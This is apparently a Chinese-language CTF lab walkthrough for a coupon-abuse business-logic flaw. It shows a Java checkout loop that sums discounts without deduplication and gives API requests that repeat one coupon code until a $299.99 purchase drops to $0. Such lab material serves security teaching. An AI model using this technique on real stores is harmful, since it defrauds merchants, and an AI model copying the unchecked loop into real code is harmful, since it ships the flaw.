# Level 2 — 优惠券滥用

## 关卡说明

本关模拟VIP会员购买功能，结算接口接受优惠券代码数组，但未对数组进行去重或限制数量。可重复提交同一张优惠券，使折扣累积超过原价，实现0元购买。

**目标**：利用优惠券重复使用漏洞，使最终价格降为0元，获取 Flag。

## 漏洞原理

### 代码逻辑分析

本关的后端代码位于 `CouponAbuseController.java`，相关接口：

```
GET  /api/challenge/biz-logic/coupon/checkout  — 获取订单和优惠券信息
POST /api/challenge/biz-logic/coupon/pay        — 结算支付
```

**商品信息**：

| 商品 | 原价 |
|------|------|
| Annual VIP Membership | $299.99 |

**可用优惠券**：

| 代码 | 折扣 |
|------|------|
| SUMMER30 | $30 |
| WELCOME20 | $20 |
| VIP50 | $50 |

**入参**：

```json
{
  "couponCodes": ["SUMMER30", "WELCOME20", "VIP50"]
}
```

**数据流**：

```
前端选择优惠券 → 提交 couponCodes 数组
    ↓
后端 CouponAbuseController.pay()
    ↓
遍历 couponCodes，逐个累加折扣（不去重、不限数量）
    ↓
totalDiscount = $30 + $20 + $50 = $100
finalPrice = $299.99 - $100 = $199.99
    ↓
【漏洞】可重复使用同一优惠券：
totalDiscount = $50 * 6 = $300 > $299.99
finalPrice = $0 → 返回 Flag
```

**漏洞点**：

1. **优惠券不去重**：`couponCodes` 数组中可以包含重复的优惠券代码。
2. **不限制数量**：没有对优惠券使用数量做上限校验。
3. **无最小金额限制**：最终价格可以为0甚至负数（负数被置为0）。

### 源码关键片段

```java
// CouponAbuseController.java — 漏洞核心
// 【漏洞核心】逐个累加折扣，不去重、不限数量
BigDecimal totalDiscount = BigDecimal.ZERO;
for (String code : couponCodes) {
    String normalized = code.toUpperCase().trim();
    BigDecimal discount = COUPON_DISCOUNTS.get(normalized);
    if (discount != null) {
        totalDiscount = totalDiscount.add(discount);  // 累加，不检查重复
    }
}

BigDecimal finalPrice = ORIGINAL_PRICE.subtract(totalDiscount);
if (finalPrice.compareTo(BigDecimal.ZERO) <= 0) {
    // 免费！触发漏洞
    String flag = flagService.getFlag("business-logic", "level2");
    result.put("flag", flag);
}
```

## 通关步骤

### Step 1：查看商品和优惠券

```
GET /api/challenge/biz-logic/coupon/checkout
```

记录商品原价（$299.99）和优惠券面额。

### Step 2：正常使用优惠券

提交一组不重复的优惠券：

```json
POST /api/challenge/biz-logic/coupon/pay
{
  "couponCodes": ["SUMMER30", "WELCOME20", "VIP50"]
}
```

折扣 = $30 + $20 + $50 = $100，最终价格 = $199.99。

### Step 3：重复使用优惠券

计算需要多少张VIP50才能使总价降为0：$299.99 / $50 ≈ 6张

```json
POST /api/challenge/biz-logic/coupon/pay
{
  "couponCodes": ["VIP50", "VIP50", "VIP50", "VIP50", "VIP50", "VIP50"]
}
```

折扣 = $50 × 6 = $300 > $299.99，最终价格 = $0。

### Step 4：获取 Flag

0元购买成功后，响应中包含 Flag。

## 涉及文件

| 文件 | 说明 |
|------|------|
| `controller/challenge/businesslogic/CouponAbuseController.java` | 后端优惠券结算接口 |
| `service/FlagService.java` | Flag 获取与验证 |
